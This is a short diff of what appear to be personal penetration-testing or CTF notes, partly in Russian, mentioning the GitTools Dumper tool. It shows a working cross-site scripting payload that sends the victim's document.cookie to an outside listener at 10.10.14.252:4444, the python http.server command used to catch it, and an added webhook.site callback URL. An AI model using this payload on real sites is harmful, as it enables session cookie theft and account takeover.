@@ -56,3 +56,7 @@ https://github.com/internetwache/GitTools/tree/master/Dumper
         <script>document.location='http://10.10.14.252:4444/?c='+document.cookie;</script>
         и ловим отстук 
         python3 -m http.server 4444
+
+
+ 	https://webhook.site/d7110bf3-8246-4764-ac2e-fef55a74f93a?cmd=10
+  
